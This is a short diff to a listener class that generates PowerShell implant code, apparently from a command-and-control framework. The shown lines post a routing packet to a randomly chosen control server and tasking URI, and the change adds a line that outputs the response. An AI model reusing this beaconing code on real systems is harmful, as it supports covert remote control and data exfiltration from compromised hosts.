@@ -900,6 +900,7 @@ class Listener:
                                     # get a random posting URI
                                     $taskURI = $FixedParameters["taskURIs"] | Get-Random
                                     $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response
                                 }}
                                 catch [System.Net.WebException]{{
                                     # exception posting data...
